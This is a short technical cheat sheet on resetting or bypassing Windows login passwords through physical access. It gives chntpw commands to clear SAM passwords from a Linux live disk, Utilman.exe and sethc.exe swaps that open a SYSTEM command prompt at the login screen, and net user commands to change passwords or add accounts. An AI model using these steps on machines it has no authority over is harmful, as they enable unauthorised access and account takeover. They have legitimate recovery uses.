# Windows Password

Bypass, change or remove Windows password.

## Reset the Windows password with Linux

Boot with Linux live disk.

Mount Windows system (if necessary):

```bash
sudo blkid
sudo ntfs-3g -o force /dev/sda1 /mnt
```

Remove Windows password:

```bash
sudo apt install chntpw
cd /mnt/Windows/System32/config
chntpw -l SAM
chntpw -u {Username} SAM
```

* 1 - Clear user password
* q - quit
* y - Hive (Save)

## Windows installation medium

* Boot from Windows installation disk
* Start installation
* Computer Repair Options > Troubleshoot > (Advanced Options) > Command Prompt

Show drives:

```bash
wmic logicaldisk get caption,name,volumename
```

### Hack: Command

A shell with elevated rights is started by a small hack.
You become a system user (nt-autorität\system).

* Use a "Hack"
* Check out the useful Windows commands (below)

#### Hack: Easier operation (Erleichterte bedienung)

Clicking on easier operation at the bottom right opens the Command.

```bash
cd C:\Windows\System32
rename Utilman.exe Utilman.exe.bak
copy cmd.exe Utilman.exe
```

### Hack: Press 5x Shift (If activated)

If it is activated (default), you can press 5x Shift in the Windows login and the Command appears.

```bash
cd C:\Windows\System32
rename sethc.exe sethc.exe.bak
copy cmd.exe sethc.exe
```

### Useful Windows commands

```bash
# Change a user's password
net user {username} {password}

# Add new user
net user {username} {password} /add

# Reboot immediately
shutdown /r /t 0
```
